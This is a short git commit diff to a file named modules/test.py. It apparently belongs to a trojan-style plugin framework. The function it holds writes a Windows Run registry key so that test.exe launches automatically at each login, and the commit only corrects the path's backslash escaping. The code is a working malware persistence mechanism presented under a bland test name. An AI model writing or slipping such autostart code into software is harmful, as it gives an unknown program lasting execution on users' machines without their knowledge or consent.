68db5bf2b8804c60ea0180f3de701020955c2a1d
experiment2016 <sarpiericam@libero.it>
2016-05-31 15:34:16 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -3,7 +3,7 @@ import _winreg
 def run(**args):
   try:
       exname = 'test.exe'
-      pathex = 'C:\Users\test.exe'
+      pathex = 'C:\\Users\\test.exe'
       key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',_winreg.KEY_SET_VALUE)
       _winreg.SetValueEx(key,exname,0,_winreg.REG_SZ,pathex) 
       key.Close()
